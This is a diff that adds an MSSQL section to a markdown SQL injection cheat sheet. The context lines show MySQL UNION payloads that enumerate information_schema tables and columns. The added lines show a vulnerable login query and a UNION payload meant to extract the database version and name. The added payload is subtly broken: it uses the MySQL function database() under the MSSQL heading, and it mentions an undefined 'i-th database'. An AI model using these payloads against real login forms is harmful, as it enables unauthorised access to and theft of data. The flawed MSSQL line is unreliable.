@@ -37,6 +37,12 @@
 *  _[$input_user]_ : `' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database()`
 *  _[$input_user]_ : `' UNION SELECT table_name, column_name, 1 FROM information_schema.columns`
 
+## For Mssql
+  _[Vulnearable code]_ : `SELECT * FROM table_name WHERE username='$input_user' AND pass='$input_pass'`
+###### Assume no of columns to be 3
+#### Finding version and databases
+*  _[$input_user]_ : `' UNION SELECT 1,@@version,database() --` [Here **i** is the i-th database present]
+
 ## For sqlite
  In sqlite __sqlite_master__ replaces __information_schema__
  
